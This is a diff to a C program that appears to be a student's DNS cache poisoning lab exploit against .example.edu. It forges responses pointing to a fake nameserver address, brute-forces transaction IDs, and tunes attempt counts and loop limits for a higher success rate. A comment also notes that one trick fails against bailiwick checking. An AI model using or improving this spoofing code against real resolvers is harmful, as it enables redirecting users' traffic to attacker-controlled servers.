@@ -200,6 +200,7 @@ void init_fake(char *buf){
     data[offset + 14] = 0x77;
     data[offset + 15] = 0x77; // above 4: Fake ip address for THE Domain Server for .example.edu: 119.119.119.119
         // essential for the poison
+        // but actually it doesn't work, since it's against Bailiwick checking
     
         // <Root> Type: OPT
         // 0x00 0x00 0x29 0x10 0x00 0x00 0x00 0x88 0x00 0x00 0x00
@@ -410,7 +411,7 @@ int main(int argc, char *argv[])
             printf("packet send error %d which means %s\n",errno,strerror(errno));
 
         update_fake(fake_buffer, charnumber, 0);
-        int attemp_num = 1 << 16, init_num = rand() & 0xffff;
+        int attemp_num = 5000, init_num = rand() & 0xffff;
         while(attemp_num--){
             update_fake(fake_buffer, 0, init_num);
             if(
@@ -438,9 +439,9 @@ int main(int argc, char *argv[])
         //     &address_len
         // )
 
-        sleep(1);
+        // sleep(1);
     
-        if (cnt >= 12)
+        if (cnt >= 100) // by calculating, the success probability is nearly 0.8 (after this time's modify) each time running ./udp
             break;
     }
     close(sd);
